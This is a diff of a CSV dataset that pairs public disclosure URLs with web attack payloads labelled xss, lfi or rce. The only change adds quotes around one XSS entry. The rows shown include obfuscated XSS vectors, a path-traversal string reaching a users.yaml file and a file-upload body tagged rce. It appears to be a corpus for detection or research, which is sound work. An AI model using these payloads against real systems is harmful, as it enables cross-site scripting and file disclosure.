@@ -483,5 +483,5 @@ https://vulners.com/cve/CVE-2023-31719?utm_source=rss&utm_medium=rss&utm_campaig
 https://twitter.com/jacky_ichwan/status/1721054490017886381,javascript%3Avar%20a%3D%22ale%22%3Bvar%20b%3D%22rt%22%3Bvar%20c%3D%22%28%29%22%3BdecodeURI%28%22%26lt%3Bbutton%20popovertarget%3Dx%26gt%3BClick%20me%26lt%3B%2Fbutton%26gt%3B%26lt%3Bhvita%20onbeforetoggle%3D%22%2Ba%2Bb%2Bc%2B%22%20popover%20id%3Dx%26gt%3BHvita%26lt%3B%2Fhvita%26gt%3B%22%29,xss
 https://www.linkedin.com/pulse/yamcs-vulnerability-assessment-visionspace-technologies/,../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml,lfi
 https://github.com/crater-invoice/crater/issues/1267,%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D,rce
-https://twitter.com/g1nk00/status/1735407588529913969,&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;,xss
+https://twitter.com/g1nk00/status/1735407588529913969,"&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",xss
 https://twitter.com/TheMsterDoctor1/status/1743187595163501005,&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;,xss
